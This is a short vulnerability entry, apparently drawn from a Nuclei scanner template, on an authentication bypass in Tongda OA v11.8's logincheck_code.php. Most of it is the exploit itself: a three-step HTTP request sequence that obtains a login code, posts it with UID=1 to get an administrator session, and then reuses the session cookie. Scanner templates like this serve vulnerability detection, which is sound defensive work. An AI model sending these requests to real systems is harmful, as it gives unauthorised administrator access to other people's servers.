# Vulnerability: Tongda OA v11.8 logincheck_code.php - Authentication Bypass
**Classification:** TONGDA
**Source:** Nuclei Template (`tongda-login-code-authbypass.yaml`)

## Description
There is a login bypass vulnerability in Tongda OA v11.8 logincheck_code.php, through which an attacker can log in to the system administrator background

## Vulnerable Code Pattern / Exploit Payload
```http
GET /general/login_code.php HTTP/1.1
Host: {{Hostname}}

POST /logincheck_code.php HTTP/1.1
Host: {{Hostname}}

CODEUID={{uid}}&UID=1

GET /general/index.php?isIE=0&modify_pwd=0 HTTP/1.1
Host: {{Hostname}}
Cookie: PHPSESSID={{cookie}};
```

